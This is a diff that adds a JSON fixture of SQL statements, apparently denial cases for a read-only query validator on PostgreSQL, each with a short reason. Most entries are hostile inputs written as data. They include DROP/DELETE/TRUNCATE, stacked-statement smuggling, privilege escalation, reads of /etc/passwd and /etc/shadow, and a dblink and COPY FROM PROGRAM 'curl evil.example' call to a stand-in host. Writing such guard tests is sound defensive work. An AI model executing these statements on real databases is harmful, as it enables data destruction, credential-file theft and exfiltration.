@@ -1,0 +1,282 @@
+[
+  {
+    "id": "dml-delete",
+    "sql": "DELETE FROM users",
+    "why": "direct delete"
+  },
+  {
+    "id": "dml-update",
+    "sql": "UPDATE users SET is_admin = true",
+    "why": "direct update"
+  },
+  {
+    "id": "dml-insert",
+    "sql": "INSERT INTO users (email) VALUES ('a@b.c')",
+    "why": "direct insert"
+  },
+  {
+    "id": "dml-merge",
+    "sql": "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE",
+    "why": "merge performs writes"
+  },
+  {
+    "id": "dml-truncate",
+    "sql": "TRUNCATE users",
+    "why": "truncate"
+  },
+  {
+    "id": "stacked-drop",
+    "sql": "SELECT 1; DROP TABLE users",
+    "why": "second statement rides along; parser accepts both"
+  },
+  {
+    "id": "stacked-delete",
+    "sql": "SELECT id FROM users; DELETE FROM users",
+    "why": "stacked write after a legitimate read"
+  },
+  {
+    "id": "stacked-trailing",
+    "sql": "SELECT 1; SELECT 2",
+    "why": "multi-statement is denied even when both statements are harmless reads"
+  },
+  {
+    "id": "select-into",
+    "sql": "SELECT * INTO exfil FROM users",
+    "why": "creates a table; invisible to a tag-only allowlist"
+  },
+  {
+    "id": "select-into-temp",
+    "sql": "SELECT * INTO TEMP exfil FROM users",
+    "why": "temp table creation is still a write"
+  },
+  {
+    "id": "ctas",
+    "sql": "CREATE TABLE exfil AS SELECT * FROM users",
+    "why": "create-table-as-select"
+  },
+  {
+    "id": "lock-for-update",
+    "sql": "SELECT * FROM users FOR UPDATE",
+    "why": "takes row locks; blocks the application"
+  },
+  {
+    "id": "lock-for-share",
+    "sql": "SELECT * FROM users FOR SHARE",
+    "why": "takes row locks"
+  },
+  {
+    "id": "writable-cte-delete",
+    "sql": "WITH gone AS (DELETE FROM users RETURNING *) SELECT * FROM gone",
+    "why": "data-modifying CTE under a SELECT root"
+  },
+  {
+    "id": "writable-cte-update",
+    "sql": "WITH x AS (UPDATE users SET n = 1 RETURNING id) SELECT * FROM x",
+    "why": "data-modifying CTE under a SELECT root"
+  },
+  {
+    "id": "writable-cte-insert",
+    "sql": "WITH x AS (INSERT INTO t VALUES (1) RETURNING id) SELECT * FROM x",
+    "why": "data-modifying CTE under a SELECT root"
+  },
+  {
+    "id": "fn-read-file",
+    "sql": "SELECT pg_read_file('/etc/passwd')",
+    "why": "filesystem read; uses only allowlisted node tags"
+  },
+  {
+    "id": "fn-read-file-qual",
+    "sql": "SELECT pg_catalog.pg_read_file('/etc/passwd')",
+    "why": "schema qualification does not launder it"
+  },
+  {
+    "id": "fn-read-binary",
+    "sql": "SELECT pg_read_binary_file('/etc/shadow')",
+    "why": "filesystem read"
+  },
+  {
+    "id": "fn-ls-dir",
+    "sql": "SELECT pg_ls_dir('/')",
+    "why": "filesystem enumeration"
+  },
+  {
+    "id": "fn-dblink",
+    "sql": "SELECT dblink('host=evil.example','SELECT 1')",
+    "why": "outbound network connection / exfiltration"
+  },
+  {
+    "id": "fn-sleep",
+    "sql": "SELECT pg_sleep(300)",
+    "why": "denial of service via connection hold"
+  },
+  {
+    "id": "fn-terminate",
+    "sql": "SELECT pg_terminate_backend(1)",
+    "why": "kills other sessions"
+  },
+  {
+    "id": "fn-set-config",
+    "sql": "SELECT set_config('role','postgres',false)",
+    "why": "privilege escalation via GUC"
+  },
+  {
+    "id": "fn-lo-import",
+    "sql": "SELECT lo_import('/etc/passwd')",
+    "why": "large-object filesystem read"
+  },
+  {
+    "id": "fn-query-to-xml",
+    "sql": "SELECT query_to_xml('SELECT 1', true, true, '')",
+    "why": "nested query execution escapes inspection"
+  },
+  {
+    "id": "fn-user-defined",
+    "sql": "SELECT public.my_helper(1)",
+    "why": "arbitrary user function may write"
+  },
+  {
+    "id": "fn-nested-in-where",
+    "sql": "SELECT id FROM users WHERE pg_sleep(10) IS NULL",
+    "why": "dangerous call hidden in a predicate"
+  },
+  {
+    "id": "fn-nested-in-cte",
+    "sql": "WITH a AS (SELECT pg_read_file('/etc/passwd') f) SELECT * FROM a",
+    "why": "dangerous call hidden inside a CTE"
+  },
+  {
+    "id": "copy-to-file",
+    "sql": "COPY users TO '/tmp/exfil.csv'",
+    "why": "writes a file on the database host"
+  },
+  {
+    "id": "copy-from-program",
+    "sql": "COPY t FROM PROGRAM 'curl evil.example'",
+    "why": "command execution"
+  },
+  {
+    "id": "grant",
+    "sql": "GRANT ALL ON users TO PUBLIC",
+    "why": "privilege change"
+  },
+  {
+    "id": "revoke",
+    "sql": "REVOKE SELECT ON users FROM ik_reader",
+    "why": "privilege change"
+  },
+  {
+    "id": "set-role",
+    "sql": "SET ROLE postgres",
+    "why": "privilege escalation"
+  },
+  {
+    "id": "set-txn-rw",
+    "sql": "SET TRANSACTION READ WRITE",
+    "why": "attempts to unseal the read-only transaction"
+  },
+  {
+    "id": "reset-all",
+    "sql": "RESET ALL",
+    "why": "clears session settings including RLS context"
+  },
+  {
+    "id": "do-block",
+    "sql": "DO $$ BEGIN PERFORM 1; END $$",
+    "why": "arbitrary procedural code"
+  },
+  {
+    "id": "call-proc",
+    "sql": "CALL some_procedure()",
+    "why": "procedures may write"
+  },
+  {
+    "id": "create-function",
+    "sql": "CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql",
+    "why": "ddl"
+  },
+  {
+    "id": "drop-table",
+    "sql": "DROP TABLE users",
+    "why": "ddl"
+  },
+  {
+    "id": "alter-table",
+    "sql": "ALTER TABLE users ADD COLUMN x int",
+    "why": "ddl"
+  },
+  {
+    "id": "create-index",
+    "sql": "CREATE INDEX ON users (email)",
+    "why": "ddl; also locks and consumes io"
+  },
+  {
+    "id": "explain-analyze-dml",
+    "sql": "EXPLAIN ANALYZE DELETE FROM users",
+    "why": "EXPLAIN ANALYZE actually executes the statement"
+  },
+  {
+    "id": "explain-select",
+    "sql": "EXPLAIN SELECT 1",
+    "why": "not a SELECT at the root; leaks plan details"
+  },
+  {
+    "id": "prepare",
+    "sql": "PREPARE p AS DELETE FROM users",
+    "why": "deferred write"
+  },
+  {
+    "id": "execute",
+    "sql": "EXECUTE p",
+    "why": "executes an opaque prepared statement"
+  },
+  {
+    "id": "declare-cursor",
+    "sql": "DECLARE c CURSOR FOR SELECT * FROM users",
+    "why": "holds server-side state outside the sealed transaction"
+  },
+  {
+    "id": "listen",
+    "sql": "LISTEN ch",
+    "why": "session-level side effect"
+  },
+  {
+    "id": "notify",
+    "sql": "NOTIFY ch, 'x'",
+    "why": "session-level side effect"
+  },
+  {
+    "id": "vacuum",
+    "sql": "VACUUM users",
+    "why": "maintenance command; heavy io"
+  },
+  {
+    "id": "refresh-matview",
+    "sql": "REFRESH MATERIALIZED VIEW mv",
+    "why": "writes"
+  },
+  {
+    "id": "empty",
+    "sql": "",
+    "why": "empty input must not be treated as permissive"
+  },
+  {
+    "id": "whitespace-only",
+    "sql": "   \n\t  ",
+    "why": "whitespace-only input"
+  },
+  {
+    "id": "comment-only",
+    "sql": "-- SELECT 1",
+    "why": "comment-only input yields no statement"
+  },
+  {
+    "id": "garbage",
+    "sql": "SELEKT 1",
+    "why": "parse failure must deny, never pass through"
+  },
+  {
+    "id": "comment-hidden-dml",
+    "sql": "SELECT 1 /* harmless */; DELETE FROM users",
+    "why": "comment does not neutralise the stacked statement"
+  }
+]
